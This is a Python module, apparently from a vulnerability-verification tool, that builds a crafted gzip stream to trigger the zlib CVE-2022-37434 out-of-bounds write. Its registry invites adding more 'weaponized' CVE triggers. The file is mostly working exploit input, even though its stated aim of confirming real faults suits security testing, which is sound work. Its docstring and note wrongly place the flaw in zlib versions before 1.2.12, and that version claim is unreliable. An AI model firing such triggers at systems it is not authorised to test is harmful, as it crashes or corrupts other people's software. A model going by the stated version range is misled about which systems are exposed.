"""Per-CVE weaponization: concrete, parameterized triggers for specific known CVEs.

A version match says a component is KNOWN-vulnerable; a trigger turns that into an actual input
that exercises the flaw. These are hand-authored per CVE (there is no general recipe from a CVE
id to an exploit), registered by CVE id, and consumed by the `cve_poc` stage, which feeds the
trigger to a matched target and records a VERIFIED PoC only if the target actually faults -- so a
fixed/unaffected target is never falsely flagged.

Each trigger returns a Trigger: the input bytes, how to feed them (stdin/arg/file/stdin-slow),
the CWE, and a human note. stdlib only.
"""
from __future__ import annotations

import struct
import zlib
from dataclasses import dataclass, field


@dataclass
class Trigger:
    cve: str
    data: bytes
    channel: str = "stdin"          # stdin | file | arg | stdin-slow (byte-dribble)
    cwe: str = "CWE-787"
    note: str = ""
    libraries: tuple = field(default_factory=tuple)   # which detected libs this applies to


def _cve_2022_37434(extra_len: int = 0x1000) -> Trigger:
    """zlib CVE-2022-37434: a heap buffer over-read/overflow in inflate() when a gzip header has
    an oversized EXTRA field (FEXTRA) and the application supplied a small `extra` buffer to
    inflateGetHeader(). Pre-1.2.12 inflate copies into head->extra past head->extra_max. The
    trigger is a gzip stream whose FEXTRA XLEN far exceeds any reasonable extra_max; feeding it a
    byte at a time (channel 'stdin-slow') maximises the chance the copy spans the boundary."""
    xlen = extra_len & 0xFFFF
    flg = 0x04                                   # FEXTRA
    hdr = b"\x1f\x8b\x08" + bytes([flg]) + b"\x00\x00\x00\x00" + b"\x00\xff"
    hdr += struct.pack("<H", xlen) + (b"A" * xlen)
    co = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw deflate body (empty payload)
    body = co.compress(b"") + co.flush()
    trailer = struct.pack("<II", zlib.crc32(b"") & 0xFFFFFFFF, 0)
    data = hdr + body + trailer
    return Trigger(cve="CVE-2022-37434", data=data, channel="stdin-slow", cwe="CWE-787",
                   libraries=("zlib",),
                   note=("gzip stream with an oversized FEXTRA extra field; triggers the "
                         "inflate() out-of-bounds write in zlib < 1.2.12 when the app uses "
                         "inflateGetHeader() with a small extra buffer"))


# CVE id -> trigger factory. Add entries here to weaponize more version-matched CVEs.
_TRIGGERS = {
    "CVE-2022-37434": _cve_2022_37434,
}


def for_cve(cve: str):
    """The Trigger for a CVE id, or None when none is authored."""
    fn = _TRIGGERS.get((cve or "").upper())
    return fn() if fn else None


def available() -> set:
    return set(_TRIGGERS)
